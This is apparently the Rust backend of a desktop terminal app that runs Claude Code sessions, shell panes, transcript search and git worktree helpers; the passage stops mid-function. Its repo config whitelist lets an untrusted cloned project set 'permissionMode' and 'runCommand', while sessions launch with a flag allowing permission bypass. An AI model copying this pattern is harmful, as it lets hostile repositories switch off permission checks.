use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::io::{BufRead, BufReader, Write};
use std::process::{Child, ChildStdin, Command, Stdio};
use std::sync::Arc;
use std::sync::Mutex;
use std::sync::MutexGuard;
use tauri::{AppHandle, Emitter, State};

mod mcp;

/// A poisoned mutex (panic in another pane's thread) must not take every pane down with it.
fn lock<T>(m: &Mutex<T>) -> MutexGuard<'_, T> {
    m.lock().unwrap_or_else(|e| e.into_inner())
}

struct Session {
    child: Child,
    /// Own lock: a write to a busy CLI blocks, and holding the `Sessions` map lock for that would freeze
    /// every other pane (and the UI thread calling into it).
    stdin: Arc<Mutex<ChildStdin>>,
}

#[derive(Default)]
struct Sessions(Mutex<HashMap<String, Session>>);

#[derive(Clone, Serialize)]
struct SessionEvent {
    id: String,
    line: String,
}

#[derive(Deserialize)]
struct ImageAttachment {
    media_type: String,
    data: String,
}

#[tauri::command]
fn start_session(
    app: AppHandle,
    state: State<Sessions>,
    id: String,
    cwd: Option<String>,
    resume: Option<String>,
    fork: bool,
    permission_mode: Option<String>,
    model: Option<String>,
    effort: Option<String>,
    name: Option<String>,
) -> Result<(), String> {
    let mut cmd = Command::new("claude");
    cmd.args([
        "-p",
        "--verbose",
        "--input-format",
        "stream-json",
        "--output-format",
        "stream-json",
        "--include-partial-messages",
        "--permission-prompt-tool",
        "stdio", // permission prompts arrive as control_request can_use_tool; UI answers via write_line
        "--allow-dangerously-skip-permissions", // lets the mode dropdown switch to bypassPermissions live
    ]);
    if let Some(r) = &resume {
        cmd.args(["--resume", r]);
        if fork {
            cmd.arg("--fork-session");
        }
    }
    if let Some(m) = &permission_mode {
        cmd.args(["--permission-mode", m]);
    }
    if let Some(m) = model.as_deref().filter(|m| !m.is_empty()) {
        cmd.args(["--model", m]);
    }
    if let Some(e) = effort.as_deref().filter(|e| !e.is_empty()) {
        cmd.args(["--effort", e]);
    }
    if let Some(n) = name.as_deref().filter(|n| !n.is_empty()) {
        cmd.args(["--name", n]);
    }
    cmd.arg("--include-hook-events");
    cmd.arg("--forward-subagent-text"); // subagent output shows up in the pane instead of vanishing into the Task tool
    // this app as an MCP server (same binary, --mcp) so the session can spawn sibling panes; X_TERM_PANE tells the bridge who calls
    let sock = mcp::active_sock();
    if let (Ok(exe), false) = (std::env::current_exe(), sock.as_os_str().is_empty()) {
        cmd.args(["--mcp-config", &serde_json::json!({"mcpServers":{"x-term":{"command": exe, "args": ["--mcp"]}}}).to_string()]);
        cmd.args(["--append-system-prompt", mcp::SYSTEM_PROMPT]);
        cmd.env("X_TERM_PANE", &id);
        cmd.env("X_TERM_SOCK", &sock); // this instance's socket, not whichever one won the default name
        cmd.env("MCP_TOOL_TIMEOUT", mcp::CALL_TIMEOUT.as_millis().to_string()); // wait_agents blocks for up to the caller's timeout
    }
    let cwd = cwd.filter(|d| !d.is_empty()).unwrap_or_else(|| std::env::var("HOME").unwrap_or("/".into()));
    let cfg = config_for(&cwd);
    // config `claudeArgs`: any extra CLI flags (--max-budget-usd, --fallback-model, --add-dir, --mcp-config, --allowedTools ...).
    // A stray bool/object/array is a config mistake worth reporting, not something to silently drop.
    let mut extra: Vec<String> = vec![];
    for a in cfg["claudeArgs"].as_array().into_iter().flatten() {
        match a {
            serde_json::Value::String(s) if s.is_empty() => {}
            serde_json::Value::String(s) => extra.push(s.clone()),
            serde_json::Value::Number(n) => extra.push(n.to_string()),
            _ => return Err("claudeArgs must be strings".into()),
        }
    }
    // `autocompact`: string or integer; an explicit --autocompact in claudeArgs wins
    let autocompact = match &cfg["autocompact"] {
        serde_json::Value::String(s) if s == "auto" || (!s.is_empty() && s.chars().all(|c| c.is_ascii_digit())) => Some(s.clone()), // project-settable: never an arbitrary token
        serde_json::Value::Number(n) if n.is_u64() => Some(n.to_string()),
        _ => None,
    };
    if let Some(v) = autocompact.filter(|_| !extra.iter().any(|a| a == "--autocompact")) {
        cmd.args(["--autocompact", &v]);
    }
    cmd.args(&extra);
    cmd.current_dir(&cwd);
    let mut child = cmd
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .map_err(|e| format!("spawn claude: {e}"))?;
    let stdin = child.stdin.take().ok_or("no stdin")?;
    let stdout = child.stdout.take().ok_or("no stdout")?;
    let stderr = child.stderr.take().ok_or("no stderr")?;

    let (app2, id2) = (app.clone(), id.clone());
    std::thread::spawn(move || {
        for line in BufReader::new(stdout).lines().map_while(Result::ok) {
            let _ = app2.emit("session-event", SessionEvent { id: id2.clone(), line });
        }
        let _ = app2.emit(
            "session-event",
            SessionEvent { id: id2, line: r#"{"type":"exit"}"#.into() },
        );
    });
    let (app3, id3) = (app, id.clone());
    std::thread::spawn(move || {
        for line in BufReader::new(stderr).lines().map_while(Result::ok) {
            let _ = app3.emit(
                "session-event",
                SessionEvent {
                    id: id3.clone(),
                    line: serde_json::json!({"type":"stderr","text":line}).to_string(),
                },
            );
        }
    });
    lock(&state.0).insert(id, Session { child, stdin: Arc::new(Mutex::new(stdin)) });
    Ok(())
}

/// The session's stdin handle, with the `Sessions` map lock released before the caller writes to it.
fn session_stdin(state: &State<Sessions>, id: &str) -> Result<Arc<Mutex<ChildStdin>>, String> {
    lock(&state.0).get(id).map(|s| s.stdin.clone()).ok_or_else(|| "no such session".to_string())
}

fn write_json_line(stdin: &Mutex<ChildStdin>, line: &str) -> Result<(), String> {
    let mut w = lock(stdin);
    writeln!(w, "{line}").and_then(|_| w.flush()).map_err(|e| e.to_string())
}

#[tauri::command]
fn send_message(
    state: State<Sessions>,
    id: String,
    text: String,
    images: Vec<ImageAttachment>,
) -> Result<(), String> {
    let mut content: Vec<serde_json::Value> = images
        .iter()
        .map(|i| {
            serde_json::json!({"type":"image","source":{"type":"base64","media_type":i.media_type,"data":i.data}})
        })
        .collect();
    content.push(serde_json::json!({"type":"text","text":text}));
    let msg = serde_json::json!({"type":"user","message":{"role":"user","content":content}});
    let stdin = session_stdin(&state, &id)?;
    write_json_line(&stdin, &msg.to_string())
}

/// Writes an exported conversation to `<exportDir>/<name>.md` (default ~/Downloads) and returns the path.
#[tauri::command]
fn save_export(name: String, content: String) -> Result<String, String> {
    // the name becomes a filename: a separator or ".." would let a pane title write outside the export dir
    if name.is_empty() || name.contains('/') || name.contains('\\') || name.contains("..") {
        return Err("export name must not contain / \\ or ..".into());
    }
    let dir = config()["exportDir"]
        .as_str()
        .filter(|d| !d.is_empty())
        .map(expand_tilde)
        .unwrap_or_else(|| std::path::PathBuf::from(home()).join("Downloads"));
    std::fs::create_dir_all(&dir).map_err(|e| e.to_string())?;
    let path = dir.join(format!("{name}.md"));
    std::fs::write(&path, content).map_err(|e| e.to_string())?;
    Ok(path.to_string_lossy().into_owned())
}

/// Runs the user's Claude Code statusLine command (from ~/.claude/settings.json) with `json` on stdin.
#[tauri::command]
fn run_statusline(json: String) -> String {
    let cmd = std::fs::read_to_string(format!("{}/.claude/settings.json", home()))
        .ok()
        .and_then(|s| serde_json::from_str::<serde_json::Value>(&s).ok())
        .and_then(|v| v["statusLine"]["command"].as_str().map(String::from));
    let Some(cmd) = cmd else { return String::new() };
    let Ok(mut child) = Command::new("sh").args(["-c", &cmd]).stdin(Stdio::piped()).stdout(Stdio::piped()).stderr(Stdio::null()).spawn() else { return String::new() };
    let _ = child.stdin.take().unwrap().write_all(json.as_bytes());
    // a hanging statusLine script must not pin this command thread forever: 5 s, then kill
    let pid = child.id();
    let (tx, rx) = std::sync::mpsc::channel();
    std::thread::spawn(move || { let _ = tx.send(child.wait_with_output().map(|o| String::from_utf8_lossy(&o.stdout).into_owned()).unwrap_or_default()); });
    match rx.recv_timeout(std::time::Duration::from_secs(5)) {
        Ok(out) => out,
        Err(_) => { let _ = Command::new("kill").args(["-9", &pid.to_string()]).status(); String::new() }
    }
}

// ---- PTY terminal panes ----------------------------------------------------------------------

struct Pty {
    master: Box<dyn portable_pty::MasterPty + Send>,
    /// Own lock, for the same reason as `Session::stdin`: a full pty buffer must not block other panes.
    writer: Arc<Mutex<Box<dyn Write + Send>>>,
    child: Box<dyn portable_pty::Child + Send + Sync>,
    pid: Option<u32>,
    closed: std::sync::Arc<std::sync::atomic::AtomicBool>, // set by pty_close so the reader does not report a pty-exit the UI caused
}

#[derive(Default)]
struct Ptys(Mutex<HashMap<String, Pty>>);

/// Spawn the config's `shell` (default `$SHELL`) in a pty. Output streams as `pty-data` {id, data} events (UTF-8 safe across chunk
/// boundaries); `pty-exit` {id} when the shell exits.
#[tauri::command]
fn pty_open(app: AppHandle, state: State<Ptys>, id: String, cwd: Option<String>, cols: u16, rows: u16) -> Result<(), String> {
    use portable_pty::{native_pty_system, CommandBuilder, PtySize};
    let pair = native_pty_system()
        .openpty(PtySize { rows, cols, pixel_width: 0, pixel_height: 0 })
        .map_err(|e| e.to_string())?;
    let cwd = cwd.filter(|c| !c.is_empty()).unwrap_or_else(initial_cwd);
    // `shell` may carry args ("bash -l"): first token is the program. Global config only (see PROJECT_KEYS).
    let shell = config()["shell"].as_str().map(str::to_string).filter(|s| !s.trim().is_empty())
        .unwrap_or_else(|| std::env::var("SHELL").unwrap_or_else(|_| "/bin/bash".into()));
    let mut parts = shell.split_whitespace();
    let mut cmd = CommandBuilder::new(parts.next().unwrap_or("/bin/bash"));
    for a in parts {
        cmd.arg(a);
    }
    cmd.cwd(cwd);
    cmd.env("TERM", "xterm-256color");
    cmd.env("COLORTERM", "truecolor");
    cmd.env("TERM_PROGRAM", "x-term");
    let child = pair.slave.spawn_command(cmd).map_err(|e| e.to_string())?;
    drop(pair.slave);
    let mut reader = pair.master.try_clone_reader().map_err(|e| e.to_string())?;
    let writer = pair.master.take_writer().map_err(|e| e.to_string())?;
    let pid = child.process_id();
    let closed = std::sync::Arc::new(std::sync::atomic::AtomicBool::new(false));
    lock(&state.0).insert(id.clone(), Pty { master: pair.master, writer: Arc::new(Mutex::new(writer)), child, pid, closed: closed.clone() });
    std::thread::spawn(move || {
        use std::io::Read;
        let mut buf = [0u8; 16384];
        let mut pending: Vec<u8> = Vec::new();
        loop {
            let n = match reader.read(&mut buf) { Ok(0) | Err(_) => break, Ok(n) => n };
            pending.extend_from_slice(&buf[..n]);
            let valid = utf8_flush_len(&pending);
            if valid > 0 {
                let data = String::from_utf8_lossy(&pending[..valid]).into_owned();
                pending.drain(..valid);
                let _ = app.emit("pty-data", SessionEvent { id: id.clone(), line: data });
            }
        }
        if !closed.load(std::sync::atomic::Ordering::Relaxed) {
            let _ = app.emit("pty-exit", SessionEvent { id, line: String::new() });
        }
    });
    Ok(())
}

/// Bytes safe to emit now: everything except an incomplete trailing UTF-8 sequence (which waits for the next
/// chunk). A genuinely invalid byte in the middle flushes everything (lossy) so nothing gets stuck.
fn utf8_flush_len(pending: &[u8]) -> usize {
    match std::str::from_utf8(pending) {
        Ok(_) => pending.len(),
        Err(e) if e.error_len().is_some() => pending.len(),
        Err(e) => e.valid_up_to(),
    }
}

#[tauri::command]
fn pty_write(state: State<Ptys>, id: String, data: String) -> Result<(), String> {
    let writer = lock(&state.0).get(&id).map(|p| p.writer.clone()).ok_or("no pty")?;
    let mut w = lock(&writer); // map lock released first: a full pty must not stall the other panes
    w.write_all(data.as_bytes()).and_then(|_| w.flush()).map_err(|e| e.to_string())
}

#[tauri::command]
fn pty_resize(state: State<Ptys>, id: String, cols: u16, rows: u16) -> Result<(), String> {
    let m = lock(&state.0);
    let p = m.get(&id).ok_or("no pty")?;
    p.master.resize(portable_pty::PtySize { rows, cols, pixel_width: 0, pixel_height: 0 }).map_err(|e| e.to_string())
}

/// Where the shell is right now (tracks `cd`), via /proc; empty if unknown.
#[tauri::command]
fn pty_cwd(state: State<Ptys>, id: String) -> String {
    let pid = lock(&state.0).get(&id).and_then(|p| p.pid);
    pid.and_then(|pid| std::fs::read_link(format!("/proc/{pid}/cwd")).ok())
        .map(|p| p.to_string_lossy().into_owned())
        .unwrap_or_default()
}

#[tauri::command]
fn pty_close(state: State<Ptys>, id: String) {
    if let Some(mut p) = lock(&state.0).remove(&id) {
        p.closed.store(true, std::sync::atomic::Ordering::Relaxed);
        let _ = p.child.kill();
        // reap off the UI thread: without a wait() the shell lingers as a zombie, with one here we would block
        std::thread::spawn(move || { let _ = p.child.wait(); });
    }
}

/// Directory new panes start in: first CLI arg if given, else the directory x-term was launched from.
#[tauri::command]
fn initial_cwd() -> String {
    std::env::args().nth(1).filter(|a| std::path::Path::new(a).is_dir())
        .or_else(|| std::env::current_dir().ok().map(|p| p.to_string_lossy().into_owned()))
        .unwrap_or_default()
}

fn home() -> String {
    std::env::var("HOME").unwrap_or_default()
}

/// `~` and `~/…` mean $HOME. `~user/…` is left alone: we cannot resolve another user's home, and rewriting it
/// would silently point at the wrong place.
fn expand_tilde(p: &str) -> std::path::PathBuf {
    if p == "~" {
        return std::path::PathBuf::from(home());
    }
    match p.strip_prefix("~/") {
        Some(rest) => std::path::PathBuf::from(home()).join(rest),
        None => std::path::PathBuf::from(p),
    }
}

/// The global config file (XDG_CONFIG_HOME aware); `config_path` hands it to the UI.
fn config_file() -> String {
    let dir = std::env::var("XDG_CONFIG_HOME").ok().filter(|d| !d.is_empty()).unwrap_or_else(|| format!("{}/.config", home()));
    format!("{dir}/x-term/config.json")
}

/// ~/.config/x-term/config.json as JSON (`{}` when missing or invalid). See README for keys.
fn config() -> serde_json::Value {
    std::fs::read_to_string(config_file()).ok().and_then(|s| serde_json::from_str(&s).ok()).unwrap_or_else(|| serde_json::json!({}))
}

/// What a repo's `.x-term.json` is allowed to set. `.x-term.json` is attacker-controlled the moment you clone a
/// repo, so it may only steer the model the agent runs on — never anything that decides what gets *executed*
/// or where files land (`shell`, `claudeArgs`, `worktreeDir`, `exportDir`, `editor`), and never UI/key settings.
const PROJECT_KEYS: [&str; 6] = ["model", "effort", "permissionMode", "autocompact", "agentModels", "runCommand"];

/// Global config + `<repo>/.x-term.json`: whitelisted project keys win, except `agentModels`, which merges per
/// weight so a project can retune one weight without restating the others.
fn merge_config(global: serde_json::Value, project: serde_json::Value) -> serde_json::Value {
    use serde_json::Value;
    let Value::Object(p) = project else { return global };
    let Value::Object(mut g) = global else {
        return Value::Object(p.into_iter().filter(|(k, _)| PROJECT_KEYS.contains(&k.as_str())).collect());
    };
    for (k, v) in p {
        if !PROJECT_KEYS.contains(&k.as_str()) {
            continue;
        }
        if k == "agentModels" {
            if let (Some(Value::Object(gm)), Value::Object(pm)) = (g.get_mut(&k), &v) {
                for (weight, cfg) in pm {
                    gm.insert(weight.clone(), cfg.clone());
                }
                continue;
            }
        }
        g.insert(k, v);
    }
    Value::Object(g)
}

/// Global config merged with the `.x-term.json` of the repo containing `cwd` (or of `cwd` itself when it is
/// not a repo). A missing or invalid project file simply contributes nothing.
fn config_for(cwd: &str) -> serde_json::Value {
    let root = git_root(cwd).unwrap_or_else(|_| cwd.to_string());
    let project = std::fs::read_to_string(std::path::Path::new(&root).join(".x-term.json"))
        .ok()
        .and_then(|s| serde_json::from_str::<serde_json::Value>(&s).ok())
        .unwrap_or_else(|| serde_json::json!({}));
    merge_config(config(), project)
}

/// Frontend errors -> stderr (see src/errlog.ts).
#[tauri::command]
fn log(msg: String) {
    eprintln!("[x-term ui] {msg}");
}

/// Effective config for a pane: global, or global + project overrides when `cwd` is given.
#[tauri::command]
fn load_config(cwd: Option<String>) -> serde_json::Value {
    match cwd.filter(|c| !c.is_empty()) {
        Some(c) => config_for(&c),
        None => config(),
    }
}

/// Path of the global config file, for "open my config" in the UI.
#[tauri::command]
fn config_path() -> String {
    config_file()
}

/// Merge `patch` into the global config file (top-level keys replace; `keys`/`agentModels` merge one level deep; a
/// null value deletes the key) and write it back pretty-printed. Used by the shortcuts dialog. Comments in the file
/// are not preserved (the file is JSON).
#[tauri::command]
fn save_config_patch(patch: serde_json::Value) -> Result<(), String> {
    let path = std::path::PathBuf::from(config_file());
    let mut cur = match std::fs::read_to_string(&path) {
        Ok(s) if !s.trim().is_empty() => serde_json::from_str::<serde_json::Value>(&s).map_err(|e| format!("config.json is not valid JSON, fix it by hand first: {e}"))?,
        _ => serde_json::json!({}),
    };
    if !cur.is_object() { return Err("config.json must hold a JSON object".into()) }
    let Some(p) = patch.as_object() else { return Err("patch must be an object".into()) };
    let obj = cur.as_object_mut().unwrap();
    for (k, v) in p {
        match (v, obj.get_mut(k)) {
            (serde_json::Value::Null, _) => { obj.remove(k); }
            (serde_json::Value::Object(pv), Some(serde_json::Value::Object(cv))) if k == "keys" || k == "agentModels" => {
                for (k2, v2) in pv { if v2.is_null() { cv.remove(k2); } else { cv.insert(k2.clone(), v2.clone()); } }
            }
            (v, _) => { obj.insert(k.clone(), v.clone()); }
        }
    }
    if let Some(d) = path.parent() { std::fs::create_dir_all(d).map_err(|e| e.to_string())?; }
    let text = serde_json::to_string_pretty(&cur).map_err(|e| e.to_string())? + "\n";
    // atomic replace so the mtime watcher never reads a half-written file
    let tmp = path.with_extension("json.tmp");
    std::fs::write(&tmp, text).map_err(|e| e.to_string())?;
    std::fs::rename(&tmp, &path).map_err(|e| e.to_string())
}

/// Everything after argv[0] (x-term's own command line), so the UI can react to launch flags.
#[tauri::command]
fn cli_args() -> Vec<String> {
    std::env::args().skip(1).collect()
}

/// Emits `config-changed` with the fresh global config whenever the file's mtime changes (or it appears/disappears).
fn watch_config(app: AppHandle) {
    std::thread::spawn(move || {
        let mtime = || std::fs::metadata(config_file()).ok().and_then(|m| m.modified().ok());
        let mut last = mtime();
        loop {
            std::thread::sleep(std::time::Duration::from_secs(2));
            let now = mtime();
            if now != last {
                last = now;
                let _ = app.emit("config-changed", config());
            }
        }
    });
}

/// Local image file -> base64 for attaching (OS drop of a .png/.jpg onto the chat).
#[tauri::command]
fn read_image(path: String) -> Result<ImageOut, String> {
    let ext = std::path::Path::new(&path).extension().and_then(|e| e.to_str()).unwrap_or("").to_ascii_lowercase();
    let media_type = match ext.as_str() { "png" => "image/png", "jpg" | "jpeg" => "image/jpeg", "gif" => "image/gif", "webp" => "image/webp", _ => return Err("not an image".into()) };
    let bytes = std::fs::read(&path).map_err(|e| e.to_string())?;
    Ok(ImageOut { media_type: media_type.into(), data: base64(&bytes) })
}

#[derive(Serialize)]
struct ImageOut {
    media_type: String,
    data: String,
}

fn base64(b: &[u8]) -> String {
    const T: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut out = String::with_capacity((b.len() + 2) / 3 * 4);
    for c in b.chunks(3) {
        let n = (c[0] as u32) << 16 | (*c.get(1).unwrap_or(&0) as u32) << 8 | *c.get(2).unwrap_or(&0) as u32;
        out.push(T[(n >> 18) as usize & 63] as char);
        out.push(T[(n >> 12) as usize & 63] as char);
        out.push(if c.len() > 1 { T[(n >> 6) as usize & 63] as char } else { '=' });
        out.push(if c.len() > 2 { T[n as usize & 63] as char } else { '=' });
    }
    out
}

#[derive(Serialize)]
struct SearchHit {
    id: String,
    cwd: String,
    mtime: u64,
    snippet: String,
}

/// Full-text search over every stored transcript (~/.claude/projects/*/*.jsonl), newest first. Match = a user or
/// assistant text line containing `query` (case-insensitive).
/// ponytail: full scan of every transcript per query; build an index if it gets slow.
#[tauri::command]
async fn search_sessions(query: String) -> Vec<SearchHit> {
    let q = query.to_lowercase();
    if q.trim().is_empty() { return vec![] }
    let mut out = vec![];
    let Ok(projects) = std::fs::read_dir(format!("{}/.claude/projects", home())) else { return out };
    for f in projects.filter_map(|p| p.ok()).filter_map(|p| std::fs::read_dir(p.path()).ok()).flatten().filter_map(|e| e.ok()) {
        if !f.path().extension().is_some_and(|x| x == "jsonl") { continue }
        let Ok(text) = std::fs::read_to_string(f.path()) else { continue };
        let mut cwd = String::new();
        let mut snippet = None;
        for v in text.lines().filter_map(|l| serde_json::from_str::<serde_json::Value>(l).ok()) {
            if cwd.is_empty() { if let Some(c) = v["cwd"].as_str() { cwd = c.into() } }
            if v["isMeta"] == true || !(v["type"] == "user" || v["type"] == "assistant") { continue }
            let c = &v["message"]["content"];
            let t: String = c.as_str().map(String::from).unwrap_or_else(|| c.as_array().into_iter().flatten().filter_map(|b| b["text"].as_str()).collect::<Vec<_>>().join(" "));
            if let Some(i) = t.to_lowercase().find(&q) {
                let start = t[..i].char_indices().rev().nth(40).map(|(j, _)| j).unwrap_or(0);
                snippet = Some(t[start..].chars().take(120).collect::<String>().replace('\n', " "));
                break;
            }
        }
        if let (Some(snippet), Some(id)) = (snippet, f.path().file_stem().map(|s| s.to_string_lossy().into_owned())) {
            let mtime = f.metadata().ok().and_then(|m| m.modified().ok()).and_then(|m| m.duration_since(std::time::UNIX_EPOCH).ok()).map(|d| d.as_secs()).unwrap_or(0);
            out.push(SearchHit { id, cwd, mtime, snippet });
        }
    }
    out.sort_by(|a, b| b.mtime.cmp(&a.mtime));
    out.truncate(50);
    out
}

/// ~/.claude/projects/<cwd with non-alphanumerics replaced by '-'>
fn project_dir(cwd: &str) -> std::path::PathBuf {
    let enc: String = cwd.chars().map(|c| if c.is_ascii_alphanumeric() { c } else { '-' }).collect();
    std::path::PathBuf::from(format!("{}/.claude/projects/{enc}", home()))
}

#[derive(Serialize)]
struct SessionInfo {
    id: String,
    mtime: u64,
    summary: String,
    cwd: String,
}

/// First and last `n` bytes of a file as (lossy) strings; the tail starts at the first newline inside the window
/// so both halves hold only whole lines. Small files: head == whole file, tail == whole file.
fn head_tail(path: &std::path::Path, n: u64) -> Option<(String, String)> {
    use std::io::{Read, Seek, SeekFrom};
    let mut f = std::fs::File::open(path).ok()?;
    let len = f.metadata().ok()?.len();
    if len <= n {
        let mut s = String::new();
        f.read_to_string(&mut s).ok()?;
        return Some((s.clone(), s));
    }
    let mut head = vec![0u8; n as usize];
    f.read_exact(&mut head).ok()?;
    let head = String::from_utf8_lossy(&head[..head.iter().rposition(|&b| b == b'\n').unwrap_or(0)]).into_owned();
    f.seek(SeekFrom::Start(len - n)).ok()?;
    let mut tail = Vec::with_capacity(n as usize);
    f.read_to_end(&mut tail).ok()?;
    let start = tail.iter().position(|&b| b == b'\n').map(|i| i + 1).unwrap_or(0);
    Some((head, String::from_utf8_lossy(&tail[start..]).into_owned()))
}

/// One transcript file -> session summary (None for stubs without a real prompt).
fn session_info(e: &std::fs::DirEntry) -> Option<SessionInfo> {
            let id = e.path().file_stem()?.to_string_lossy().into_owned();
            let mtime = e.metadata().ok()?.modified().ok()?.duration_since(std::time::UNIX_EPOCH).ok()?.as_secs();
            // head for "has a real prompt", tail for the summary: transcripts can be tens of MB
            let (head, tail) = head_tail(&e.path(), 64 * 1024)?;
            let parse = |t: &str| t.lines().filter_map(|l| serde_json::from_str::<serde_json::Value>(l).ok()).collect::<Vec<_>>();
            let lines = parse(&head);
            // stubs: sessions that only ran a local slash command (`/clear`, a typo) have no real user prompt
            let has_prompt = lines.iter().any(|v| v["type"] == "user" && v["isMeta"] != true && match &v["message"]["content"] {
                serde_json::Value::String(s) => !s.starts_with('<'),
                serde_json::Value::Array(a) => a.iter().any(|b| b["type"] == "text" && !b["text"].as_str().unwrap_or("<").starts_with('<')),
                _ => false,
            });
            if !has_prompt {
                return None;
            }
            let cwd = lines.iter().find_map(|v| v["cwd"].as_str()).unwrap_or_default().to_string();
            let tail_lines = parse(&tail);
            let summary = tail_lines
                .iter()
                .filter_map(|v| v["lastPrompt"].as_str().or_else(|| v["message"]["content"].as_str()).map(|t| t.chars().take(80).collect::<String>()))
                .last()
                .unwrap_or_default();
            Some(SessionInfo { id, mtime, summary, cwd })
}

fn sessions_in(dir: std::path::PathBuf) -> Vec<SessionInfo> {
    let Ok(rd) = std::fs::read_dir(dir) else { return vec![] };
    rd.filter_map(|e| e.ok()).filter(|e| e.path().extension().is_some_and(|x| x == "jsonl")).filter_map(|e| session_info(&e)).collect()
}

/// Past sessions for `cwd`, newest first. Summary = last recorded prompt.
#[tauri::command]
fn list_sessions(cwd: String) -> Vec<SessionInfo> {
    let mut out = sessions_in(project_dir(&cwd));
    out.sort_by(|a, b| b.mtime.cmp(&a.mtime));
    out
}

/// Every project's sessions (sidebar), newest first, capped.
#[tauri::command]
async fn list_all_sessions() -> Vec<SessionInfo> {
    let Ok(rd) = std::fs::read_dir(format!("{}/.claude/projects", home())) else { return vec![] };
    let mut out: Vec<SessionInfo> = rd.filter_map(|e| e.ok()).flat_map(|p| sessions_in(p.path())).collect();
    out.sort_by(|a, b| b.mtime.cmp(&a.mtime));
    out.truncate(300);
    out
}

// ---- git / editor helpers for the review view and worktree panes ---------------------------------------

fn git(cwd: &str, args: &[&str]) -> Result<String, String> {
    let o = Command::new("git").arg("-C").arg(cwd).args(args).output().map_err(|e| e.to_string())?;
    if o.status.success() { Ok(String::from_utf8_lossy(&o.stdout).into_owned()) } else { Err(String::from_utf8_lossy(&o.stderr).trim().to_string()) }
}

fn git_root(cwd: &str) -> Result<String, String> {
    Ok(git(cwd, &["rev-parse", "--show-toplevel"])?.trim().to_string())
}

#[derive(Serialize)]
struct GitStatus {
    root: String,
    files: Vec<(String, String)>, // (porcelain status, path relative to root)
}

/// Working-tree changes vs HEAD for the repo containing `cwd`.
#[tauri::command]
fn git_status(cwd: String) -> Result<GitStatus, String> {
    let root = git_root(&cwd)?;
    let files = git(&root, &["status", "--porcelain", "--untracked-files=all"])?.lines().filter(|l| l.len() > 3).map(|l| (l[..2].trim().to_string(), l[3..].to_string())).collect();
    Ok(GitStatus { root, files })
}

/// Unified diff vs HEAD (one root-relative path or everything); untracked files diff against /dev/null.
#[tauri::command]
fn git_diff(cwd: String, path: Option<String>) -> Result<String, String> {
    let root = git_root(&cwd)?;
    match path {
        Some(p) => {
            let tracked = git(&root, &["ls-files", "--error-unmatch", &p]).is_ok();
            if tracked { git(&root, &["diff", "HEAD", "--", &p]) } else { Ok(git(&root, &["diff", "--no-index", "--", "/dev/null", &p]).unwrap_or_default()) }
        }
        None => git(&root, &["diff", "HEAD"]),
    }
}

/// strict: ".." would put a worktree (and the agent's cwd) outside the worktree dir, and a leading '-' would be
/// read as a flag by git. `refname` also allows the `/` and `.` real branch names use.
fn valid_name(s: &str, refname: bool) -> bool {
    !s.is_empty()
        && !s.starts_with('-')
        && !s.contains("..")
        && s.chars().all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_' || (refname && (c == '/' || c == '.')))
}

/// Same location on disk? Compares canonically, but only when both sides actually resolve.
fn same_path(a: &str, b: &str) -> bool {
    a == b || matches!((std::fs::canonicalize(a), std::fs::canonicalize(b)), (Ok(x), Ok(y)) if x == y)
}

/// `worktreeDir` template -> path: `{repo}` = git toplevel, `{name}` = worktree name, leading `~` = $HOME.
fn worktree_path(template: &str, repo: &str, name: &str) -> String {
    let filled = template.replace("{repo}", repo).replace("{name}", name);
    expand_tilde(&filled).to_string_lossy().into_owned()
}

/// Worktree for `name`: `worktreeDir` (default `<toplevel>-wt/<name>`) on branch `name` (created if missing). Returns its path.
#[tauri::command]
fn git_worktree(cwd: String, name: String) -> Result<String, String> {
    if !valid_name(&name, false) { return Err("worktree name: letters, digits, - _ only".into()) }
    let top = git_root(&cwd)?;
    let tpl = config_for(&cwd)["worktreeDir"].as_str().filter(|t| !t.is_empty()).unwrap_or("{repo}-wt/{name}").to_string();
    let path = worktree_path(&tpl, &top, &name);
    if std::path::Path::new(&path).is_dir() {
        // a directory git does not know about is someone else's: handing it to an agent would scribble over it
        let known = worktrees(&cwd)?.iter().any(|w| same_path(&w.path, &path));
        if !known { return Err(format!("{path} exists but is not a worktree of {top}")) }
        return Ok(path);
    }
    let exists = git(&top, &["rev-parse", "--verify", "--quiet", &format!("refs/heads/{name}")]).is_ok();
    if exists { git(&top, &["worktree", "add", "--", &path, &name])?; } else { git(&top, &["worktree", "add", "-b", &name, "--", &path])?; }
    Ok(path)
}

#[derive(Serialize)]
struct WorktreeInfo {
    path: String,
    branch: String, // short name, "" when detached
    head: String,   // short sha, "" for a bare repo
    main: bool,     // the repo's original checkout: the first non-bare entry
}

/// `git worktree list --porcelain` -> checkouts, main one first. A bare entry (git reports the bare repo itself
/// first when there is one) has no working tree to merge into or remove, so it is dropped.
fn parse_worktrees(porcelain: &str) -> Vec<WorktreeInfo> {
    let mut out: Vec<WorktreeInfo> = vec![];
    let mut bare = false;
    for line in porcelain.lines() {
        if let Some(p) = line.strip_prefix("worktree ") {
            bare = false;
            out.push(WorktreeInfo { path: p.to_string(), branch: String::new(), head: String::new(), main: false });
        } else if line.trim() == "bare" {
            bare = true;
            out.pop();
        } else if bare {
            continue;
        } else if let Some(h) = line.strip_prefix("HEAD ") {
            if let Some(w) = out.last_mut() { w.head = h.chars().take(7).collect() }
        } else if let Some(b) = line.strip_prefix("branch ") {
            if let Some(w) = out.last_mut() { w.branch = b.strip_prefix("refs/heads/").unwrap_or(b).to_string() }
        }
    }
    if let Some(first) = out.first_mut() { first.main = true }
    out
}

/// Every checkout of the repo containing `cwd`, main one first.
fn worktrees(cwd: &str) -> Result<Vec<WorktreeInfo>, String> {
    let top = git_root(cwd)?;
    Ok(parse_worktrees(&git(&top, &["worktree", "list", "--porcelain"])?))
}

#[tauri::command]
fn git_worktree_list(cwd: String) -> Result<Vec<WorktreeInfo>, String> {
    worktrees(&cwd)
}

/// Merge `branch` into the repo's MAIN worktree (where the user's real checkout lives). A failed merge is rolled
/// back with `merge --abort` so the main checkout is never left mid-conflict.
#[tauri::command]
fn git_worktree_merge(cwd: String, branch: String) -> Result<String, String> {
    if !valid_name(&branch, true) { return Err("branch name: letters, digits, - _ / . only".into()) }
    let main = worktrees(&cwd)?.into_iter().next().ok_or("no worktrees")?.path;
    // someone (the user, another pane) may already be resolving a merge there; aborting it would throw that away
